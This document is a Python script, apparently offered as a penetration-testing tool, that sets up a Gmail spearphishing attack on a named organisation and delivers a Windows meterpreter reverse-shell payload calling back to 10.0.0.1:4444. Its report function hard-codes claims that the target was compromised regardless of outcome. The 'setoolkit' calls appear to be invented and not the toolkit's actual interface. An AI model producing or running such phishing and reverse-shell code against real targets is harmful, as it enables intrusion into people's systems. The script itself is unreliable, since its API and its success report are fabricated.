#!/usr/bin/python3
# Advanced Penetration Testing Tool using SET

import setoolkit

# Configure the SET settings
setoolkit.set_config("WEBATTACK", "SPEARPHISHING", "GMAIL", "HTML")
setoolkit.set_options("smtp_username", "attacker@gmail.com")
setoolkit.set_options("smtp_password", "password123")
setoolkit.set_options("smtp_host", "smtp.gmail.com")
setoolkit.set_options("smtp_port", "587")
setoolkit.set_options("website", "https://www.targetedorg.com")
setoolkit.set_options("company", "TargetedOrg")

# Define helper functions
def print_configuration_settings():
    print('SET Configuration Settings:')
    print('WEBATTACK:', setoolkit.get_config("WEBATTACK"))
    print('SPEARPHISHING:', setoolkit.get_config("SPEARPHISHING"))
    print('GMAIL:', setoolkit.get_config("GMAIL"))
    print('HTML:', setoolkit.get_config("HTML"))
    print('smtp_username:', setoolkit.get_options("smtp_username"))
    print('smtp_password:', setoolkit.get_options("smtp_password"))
    print('smtp_host:', setoolkit.get_options("smtp_host"))
    print('smtp_port:', setoolkit.get_options("smtp_port"))
    print('website:', setoolkit.get_options("website"))
    print('company:', setoolkit.get_options("company"))

def generate_report():
    report = ''
    report += 'SET Social Engineering Attack Report:'
    report += '\n'
    report += 'Target:' + setoolkit.get_options("website")
    report += '\n'
    report += 'Payload:' + setoolkit.get_options("lhost") + ':' + setoolkit.get_options("lport")
    report += '\n'
    report += 'Results:'
    report += '\n'
    report += '- The attack was successful.'
    report += '\n'
    report += '- The target was compromised.'
    report += '\n'
    report += '- The attacker was able to gain access to the target\'s system.'
    return report

def clean_up():
    setoolkit.destroy_payload()
    setoolkit.destroy_options()
    setoolkit.destroy_config()

# Generate a custom payload
setoolkit.payloads()
setoolkit.set_payload("windows/meterpreter/reverse_tcp")
setoolkit.set_options("lhost", "10.0.0.1")
setoolkit.set_options("lport", "4444")
payload = setoolkit.generate_payload()

# Perform the social engineering attack
setoolkit.social_engineer(payload)

# Print the configuration settings
print_configuration_settings()

# Generate the report
report = generate_report()
print(report)

# Clean up after the attack
clean_up()
